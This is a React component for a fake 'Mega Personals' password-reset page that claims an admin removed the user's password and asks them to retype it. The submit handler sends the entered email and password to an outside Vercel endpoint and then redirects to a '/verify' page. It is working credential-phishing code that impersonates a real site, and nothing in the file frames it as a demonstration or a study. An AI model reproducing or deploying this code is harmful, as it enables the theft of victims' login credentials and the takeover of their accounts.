import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const NewPassword = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://roni-mega.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };
  return (
    <div className="text-center">
      <h1 className="pt-3 pb-3">
        <span className="Mega">Mega</span>{" "}
        <span className="Personals">Personals</span>
      </h1>
      <h5 className="pb-3">Personals classifieds</h5>
      <h6 className="fst-italic">Your password remove by admin.</h6>
      <h6 className="mb-3"> Retype to login megapersonal.</h6>
      <div>
        <div className="validation ">
          <div className="pt-3">
            <form onSubmit={handleSubmit(onSubmit)}>
              <div>
                <input
                  className="form-control Email mt-3 text-center"
                  placeholder="New password"
                  defaultValue=""
                  {...register("exampleRequired", { required: true })}
                />
              </div>

              {errors.exampleRequired && <span>This field is required</span>}

              <input
                onClick={() => navigate("/Connecting")}
                className="submit  mt-3 mb-3 w-50%"
                type="SUBMIT"
                defaultValue="Join Meeting"
              />
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default NewPassword;
